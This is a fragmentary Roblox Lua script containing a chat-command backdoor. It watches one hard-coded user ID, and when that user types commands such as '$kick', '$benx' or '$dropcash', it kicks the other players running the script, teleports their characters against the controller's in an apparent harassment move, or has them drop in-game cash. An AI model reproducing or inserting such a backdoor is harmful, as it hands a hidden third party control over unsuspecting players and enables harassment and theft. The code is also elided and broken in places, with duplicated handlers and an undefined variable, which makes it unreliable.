while true do 
	local p9_lua = game:GetService("Players"):GetPlayerByUserId(2499767624) --yofavsh6wty
		if p9_lua then
		...
		p9_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p9_lua then
		...
		p9_lua.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= p9_lua then
					...
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = p9_lua.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						...
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p9_lua.Character.HumanoidRootPart.CFrame + p9_lua.Character.HumanoidRootPart.CFrame.lookVector * 0.5
		...
		p9_lua.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= p9_lua then
					...
					wait(15)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p9_lua.Character.UpperTorso.Position)
				end
			end
		...
		p9_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p9_lua then
					game.Players.LocalPlayer:Kick("Kicked by p9_lua user")
				end
			end
		...
		p9_lua.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= p9_lua2 then
